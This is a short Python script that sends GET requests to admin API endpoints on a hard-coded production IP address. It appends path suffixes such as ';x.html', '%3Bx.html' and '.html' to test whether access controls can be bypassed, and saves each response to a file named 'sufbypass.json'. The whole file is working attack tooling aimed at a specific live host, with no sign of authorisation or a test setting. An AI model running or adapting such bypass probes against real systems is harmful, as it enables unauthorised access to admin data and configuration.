import urllib.request, time, json
base="http://144.123.22.234:9080/prod-api"
tests=[
 "/system/dict/type/list",
 "/system/dict/type/list;x.html",
 "/system/dict/type/list;a=.html",
 "/system/dict/type/list;a=x.html",
 "/system/dict/type/list;.html",
 "/system/dict/type/list%3Bx.html",
 "/system/dict/type/list;/x.html",
 "/system/dict/type/list;%2ehtml",
 "/system/dict/type/list.html",
 "/system/config/configKey/sys.account.captchaEnabled",
 "/system/config/configKey/sys.account.captchaEnabled;x.html",
 "/system/config/configKey/sys.account.captchaEnabled;a=.html",
]
out=[]
for p in tests:
    url=base+p
    req=urllib.request.Request(url,method='GET',headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'})
    try:
        with urllib.request.urlopen(req,timeout=15) as r: st=r.status; body=r.read(800).decode('utf-8','replace')
    except urllib.error.HTTPError as e: st=e.code; body=e.read(800).decode('utf-8','replace')
    except Exception as e: st=-1; body='ERR:'+str(e)
    rec={'path':p,'status':st,'body':body}; out.append(rec)
    print(f"[{st}] {p} :: {body[:220]}", flush=True)
    time.sleep(0.5)
json.dump(out,open('sufbypass.json','w'),ensure_ascii=False,indent=1)
